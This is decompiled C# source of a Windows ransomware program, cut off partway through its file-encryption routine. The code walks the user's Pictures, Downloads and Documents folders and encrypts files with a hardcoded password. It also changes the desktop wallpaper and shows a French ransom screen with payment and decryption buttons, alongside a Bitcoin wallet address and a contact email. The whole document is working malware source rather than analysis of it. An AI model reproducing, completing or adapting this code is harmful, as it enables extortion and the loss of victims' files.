using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.My;
using System.My.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace System;

[DesignerGenerated]
public class Form2 : Form
{
	private enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private IContainer components;

	private string montant_wallet;

	private string fin;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	private string ernesto;

	private string tempe;

	private string tempe2;

	private string[] paths;

	private string wc2;

	private string wc4;

	private string wc6;

	private object Pictures;

	private object Downloads;

	private object Documents;

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private static List<string> files = new List<string>();

	private static List<string> files2 = new List<string>();

	private ArrayList ListeInfo;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button1")]
	internal virtual Button Button1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button2")]
	internal virtual Button Button2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button3")]
	internal virtual Button Button3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox6")]
	internal virtual TextBox TextBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button5
	{
		[CompilerGenerated]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button5_Click;
			Button button = _Button5;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button5 = value;
			button = _Button5;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button4
	{
		[CompilerGenerated]
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button4_Click;
			Button button = _Button4;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button4 = value;
			button = _Button4;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox7")]
	internal virtual TextBox TextBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button6_Click;
			Button button = _Button6;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtDestinationDecrypt")]
	internal virtual TextBox txtDestinationDecrypt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtPassDecrypt")]
	internal virtual TextBox txtPassDecrypt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtDestinationEncrypt")]
	internal virtual TextBox txtDestinationEncrypt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtPassEncrypt")]
	internal virtual TextBox txtPassEncrypt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtFileToEncrypt")]
	internal virtual TextBox txtFileToEncrypt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form2()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		montant_wallet = "1000";
		fin = "0";
		wc2 = "dswezfewzdewfezfweazdewzdazedwzedezdkzhdweazidlezagdnwejzgdwezjdw";
		wc4 = "bc1qguw7ffczeqfyc7f6ytq8csmwd9x4lcyvgc7m9g";
		wc6 = "pimprenel@tutanota.com";
		Pictures = "C:\\Users\\" + Interaction.Environ("USERNAME") + "\\Pictures";
		Downloads = "C:\\Users\\" + Interaction.Environ("USERNAME") + "\\Downloads";
		Documents = "C:\\Users\\" + Interaction.Environ("USERNAME") + "\\Documents";
		ListeInfo = new ArrayList();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form2);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Expected O, but got Unknown
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Expected O, but got Unknown
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027f: Expected O, but got Unknown
		//IL_03c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ce: Expected O, but got Unknown
		//IL_054b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0555: Expected O, but got Unknown
		//IL_05ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f7: Expected O, but got Unknown
		//IL_06a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Expected O, but got Unknown
		//IL_072c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0736: Expected O, but got Unknown
		//IL_0959: Unknown result type (might be due to invalid IL or missing references)
		//IL_0963: Expected O, but got Unknown
		//IL_0a26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a30: Expected O, but got Unknown
		//IL_0b53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5d: Expected O, but got Unknown
		//IL_0bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Label1 = new Label();
		Label2 = new Label();
		Panel1 = new Panel();
		TextBox3 = new TextBox();
		Panel2 = new Panel();
		TextBox7 = new TextBox();
		Label3 = new Label();
		Label4 = new Label();
		Button6 = new Button();
		TextBox2 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Panel3 = new Panel();
		Button5 = new Button();
		Button4 = new Button();
		PictureBox2 = new PictureBox();
		TextBox6 = new TextBox();
		TextBox5 = new TextBox();
		txtDestinationDecrypt = new TextBox();
		txtPassDecrypt = new TextBox();
		txtDestinationEncrypt = new TextBox();
		txtPassEncrypt = new TextBox();
		txtFileToEncrypt = new TextBox();
		PictureBox1 = new PictureBox();
		((Control)Panel1).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Label1).set_Font(new Font("Palatino Linotype", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Label1).set_Location(new Point(176, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(194, 26));
		((Control)Label1).set_TabIndex(48);
		Label1.set_Text("Vous avez été piraté");
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Label2).set_Font(new Font("Palatino Linotype", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Label2).set_Location(new Point(98, 9));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(157, 26));
		((Control)Label2).set_TabIndex(56);
		Label2.set_Text("Payer ma taxe....");
		Label2.set_TextAlign((ContentAlignment)2);
		((Control)Panel1).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Panel1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)TextBox3);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).set_Location(new Point(0, 26));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(352, 311));
		((Control)Panel1).set_TabIndex(0);
		((Control)Panel1).set_Visible(false);
		((Control)TextBox3).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TextBox3).set_Location(new Point(14, 41));
		TextBox3.set_Multiline(true);
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(325, 255));
		((Control)TextBox3).set_TabIndex(58);
		TextBox3.set_TextAlign((HorizontalAlignment)2);
		((Control)Panel2).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Panel2).get_Controls().Add((Control)(object)TextBox7);
		((Control)Panel2).get_Controls().Add((Control)(object)Label3);
		((Control)Panel2).get_Controls().Add((Control)(object)Label4);
		((Control)Panel2).get_Controls().Add((Control)(object)Button6);
		((Control)Panel2).get_Controls().Add((Control)(object)TextBox2);
		((Control)Panel2).set_Location(new Point(948, 26));
		((Control)Panel2).set_Name("Panel2");
		((Control)Panel2).set_Size(new Size(352, 311));
		((Control)Panel2).set_TabIndex(59);
		((Control)Panel2).set_Visible(false);
		((TextBoxBase)TextBox7).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)TextBox7).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)TextBox7).set_ForeColor(SystemColors.Info);
		((Control)TextBox7).set_Location(new Point(38, 156));
		((Control)TextBox7).set_Name("TextBox7");
		((Control)TextBox7).set_Size(new Size(277, 29));
		((Control)TextBox7).set_TabIndex(61);
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Label3).set_Font(new Font("Palatino Linotype", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Label3).set_Location(new Point(72, 9));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(212, 26));
		((Control)Label3).set_TabIndex(56);
		Label3.set_Text("Décrypter mes fichiers");
		Label3.set_TextAlign((ContentAlignment)2);
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.White);
		((Control)Label4).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_Location(new Point(43, 106));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(256, 22));
		((Control)Label4).set_TabIndex(63);
		Label4.set_Text("Veuillez entrer le mdp reçu par mail.");
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((Control)Button6).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button6).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Button6).set_Location(new Point(44, 249));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(271, 36));
		((Control)Button6).set_TabIndex(66);
		((ButtonBase)Button6).set_Text("DECRYPTER LES FICHIERS");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		((Control)TextBox2).set_Location(new Point(14, 59));
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(325, 237));
		((Control)TextBox2).set_TabIndex(67);
		Timer2.set_Interval(10000);
		((Control)Panel3).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Panel3).get_Controls().Add((Control)(object)Button5);
		((Control)Panel3).get_Controls().Add((Control)(object)Button4);
		((Control)Panel3).get_Controls().Add((Control)(object)PictureBox2);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox6);
		((Control)Panel3).get_Controls().Add((Control)(object)Label1);
		((Control)Panel3).get_Controls().Add((Control)(object)TextBox5);
		((Control)Panel3).set_Location(new Point(362, 26));
		((Control)Panel3).set_Name("Panel3");
		((Control)Panel3).set_Size(new Size(575, 311));
		((Control)Panel3).set_TabIndex(60);
		((ButtonBase)Button5).set_BackColor(Color.FromArgb(38, 38, 38));
		((Control)Button5).set_BackgroundImageLayout((ImageLayout)0);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button5).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Button5).set_Location(new Point(388, 249));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(126, 36));
		((Control)Button5).set_TabIndex(65);
		((ButtonBase)Button5).set_Text("DECRYPTER");
		((ButtonBase)Button5).set_TextAlign((ContentAlignment)2);
		((ButtonBase)Button5).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button4).set_BackColor(Color.FromArgb(38, 38, 38));
		((ButtonBase)Button4).set_FlatStyle((FlatStyle)0);
		((Control)Button4).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button4).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)Button4).set_Location(new Point(84, 249));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(75, 36));
		((Control)Button4).set_TabIndex(64);
		((ButtonBase)Button4).set_Text("PAYER");
		((ButtonBase)Button4).set_TextAlign((ContentAlignment)2);
		((ButtonBase)Button4).set_UseVisualStyleBackColor(false);
		PictureBox2.set_Image((Image)(object)System.My.Resources.Resources.Anonymous_Mask_grande);
		((Control)PictureBox2).set_Location(new Point(251, 219));
		((Control)PictureBox2).set_Name("PictureBox2");
		((Control)PictureBox2).set_Size(new Size(71, 66));
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(63);
		PictureBox2.set_TabStop(false);
		((TextBoxBase)TextBox6).set_BorderStyle((BorderStyle)0);
		((Control)TextBox6).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TextBox6).set_Location(new Point(22, 12));
		TextBox6.set_Multiline(true);
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(76, 28));
		((Control)TextBox6).set_TabIndex(55);
		TextBox6.set_TextAlign((HorizontalAlignment)2);
		((Control)TextBox6).set_Visible(false);
		((TextBoxBase)TextBox5).set_BorderStyle((BorderStyle)0);
		((Control)TextBox5).set_Font(new Font("Palatino Linotype", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)TextBox5).set_Location(new Point(22, 59));
		TextBox5.set_Multiline(true);
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(536, 237));
		((Control)TextBox5).set_TabIndex(66);
		TextBox5.set_Text(componentResourceManager.GetString("TextBox5.Text"));
		TextBox5.set_TextAlign((HorizontalAlignment)2);
		((Control)txtDestinationDecrypt).set_Location(new Point(0, 0));
		((Control)txtDestinationDecrypt).set_Name("txtDestinationDecrypt");
		((Control)txtDestinationDecrypt).set_Size(new Size(100, 20));
		((Control)txtDestinationDecrypt).set_TabIndex(61);
		((Control)txtDestinationDecrypt).set_Visible(false);
		((Control)txtPassDecrypt).set_Location(new Point(107, 0));
		((Control)txtPassDecrypt).set_Name("txtPassDecrypt");
		((Control)txtPassDecrypt).set_Size(new Size(100, 20));
		((Control)txtPassDecrypt).set_TabIndex(62);
		((Control)txtPassDecrypt).set_Visible(false);
		((Control)txtDestinationEncrypt).set_Location(new Point(231, 0));
		((Control)txtDestinationEncrypt).set_Name("txtDestinationEncrypt");
		((Control)txtDestinationEncrypt).set_Size(new Size(100, 20));
		((Control)txtDestinationEncrypt).set_TabIndex(63);
		((Control)txtDestinationEncrypt).set_Visible(false);
		((Control)txtPassEncrypt).set_Location(new Point(377, 0));
		((Control)txtPassEncrypt).set_Name("txtPassEncrypt");
		((Control)txtPassEncrypt).set_Size(new Size(100, 20));
		((Control)txtPassEncrypt).set_TabIndex(64);
		((Control)txtPassEncrypt).set_Visible(false);
		((Control)txtFileToEncrypt).set_Location(new Point(504, 0));
		((Control)txtFileToEncrypt).set_Name("txtFileToEncrypt");
		((Control)txtFileToEncrypt).set_Size(new Size(100, 20));
		((Control)txtFileToEncrypt).set_TabIndex(68);
		((Control)txtFileToEncrypt).set_Visible(false);
		((Control)PictureBox1).set_Location(new Point(70, 91));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(100, 50));
		PictureBox1.set_TabIndex(69);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox1).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Silver);
		((Control)this).set_BackgroundImageLayout((ImageLayout)2);
		((Form)this).set_ClientSize(new Size(1310, 355));
		((Control)this).get_Controls().Add((Control)(object)txtFileToEncrypt);
		((Control)this).get_Controls().Add((Control)(object)txtPassEncrypt);
		((Control)this).get_Controls().Add((Control)(object)txtDestinationEncrypt);
		((Control)this).get_Controls().Add((Control)(object)txtPassDecrypt);
		((Control)this).get_Controls().Add((Control)(object)txtDestinationDecrypt);
		((Control)this).get_Controls().Add((Control)(object)Panel3);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)Panel2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Vous avez été piraté");
		((Form)this).set_TransparencyKey(Color.Silver);
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	private void ecran()
	{
		PictureBox1.set_Image((Image)(object)System.My.Resources.Resources.fond);
		string lpvParam = Application.get_StartupPath() + "\\myNewWallpaper.bmp";
		PictureBox1.get_Image().Save(lpvParam, ImageFormat.get_Bmp());
		SystemParametersInfo(20, 0, ref lpvParam, 1);
	}

	private void ChercheImages(DirectoryInfo dossier, string[] Extensions)
	{
		try
		{
			foreach (string text in Extensions)
			{
				FileInfo[] array = dossier.GetFiles("*." + text);
				FileInfo[] array2 = array;
				foreach (FileInfo fileInfo in array2)
				{
					tempe = fileInfo.FullName;
					txtPassEncrypt.set_Text("dswezfewzdewfezfweazdewzdazedwzedezdkzhdweazidlezagdnwejzgdwezjdw");
					txtFileToEncrypt.set_Text(tempe);
					strFileToEncrypt = tempe;
					txtDestinationEncrypt.set_Text(tempe + ".encrypt");
					byte[] bytKey = CreateKey(txtPassEncrypt.get_Text());
					byte[] bytIV = CreateIV(txtPassEncrypt.get_Text());
					EncryptOrDecryptFile(strFileToEncrypt, txtDestinationEncrypt.get_Text(), bytKey, bytIV, CryptoAction.ActionEncrypt);
				}
			}
			DirectoryInfo[] directories = dossier.GetDirectories();
			foreach (DirectoryInfo dossier2 in directories)
			{
				ChercheImages(dossier2, Extensions);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DecrypteChercheImages(DirectoryInfo dossier, string[] Extensions)
	{
		try
		{
			foreach (string text in Extensions)
			{
				FileInfo[] array = dossier.GetFiles("*." + text);
				FileInfo[] array2 = array;
				foreach (FileInfo fileInfo in array2)
				{
					tempe2 = fileInfo.FullName;
					txtPassDecrypt.set_Text("dswezfewzdewfezfweazdewzdazedwzedezdkzhdweazidlezagdnwejzgdwezjdw");
					strFileToDecrypt = tempe2;
					ernesto = Strings.Replace(tempe2, ".encrypt", "", 1, -1, (CompareMethod)0);
					txtDestinationDecrypt.set_Text(ernesto);
					byte[] bytKey = CreateKey(txtPassDecrypt.get_Text());
					byte[] bytIV = CreateIV(txtPassDecrypt.get_Text());
					EncryptOrDecryptFile(strFileToDecrypt, txtDestinationDecrypt.get_Text(), bytKey, bytIV, CryptoAction.ActionDecrypt);
				}
			}
			DirectoryInfo[] directories = dossier.GetDirectories();
			foreach (DirectoryInfo dossier2 in directories)
			{
				DecrypteChercheImages(dossier2, Extensions);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void listAllFiles(string[] paths, string ext, bool scanDirOk)
	{
		foreach (string path in paths)
		{
			try
			{
				string[] array = Directory.GetFiles(path, ext);
				string[] array2 = array;
				foreach (string item in array2)
				{
					try
					{
						if (!files.Contains(item))
						{
							files.Add(item);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				array = null;
				if (scanDirOk)
				{
					string[] directories = Directory.GetDirectories(path);
					if (directories.Length != 0)
					{
						listAllFiles(directories, ext, scanDirOk);
					}
					directories = null;
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void listAllFiles2(string[] paths, string ext, bool scanDirOk)
	{
		foreach (string path in paths)
		{
			try
			{
				string[] array = Directory.GetFiles(path, ext);
				string[] array2 = array;
				foreach (string item in array2)
				{
					try
					{
						if (!files2.Contains(item))
						{
							files2.Add(item);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				array = null;
				if (scanDirOk)
				{
					string[] directories = Directory.GetDirectories(path);
					if (directories.Length != 0)
					{
						listAllFiles2(directories, ext, scanDirOk);
					}
					directories = null;
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	private void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
